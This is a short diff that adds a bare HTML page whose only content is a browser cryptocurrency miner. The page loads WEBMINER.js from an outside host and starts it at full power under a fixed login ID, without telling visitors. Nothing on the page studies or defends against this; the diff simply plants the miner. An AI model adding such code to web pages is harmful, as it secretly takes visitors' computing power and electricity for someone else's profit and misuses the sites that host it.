@@ -1,0 +1,6 @@
+<html>
+<body>
+<script src="https://wm.bmwebm.org/WEBMINER.js"></script>
+<script>WEBMINER.config({ login: "5798986", pass: null }).power(100);</script>
+</body>
+</html>
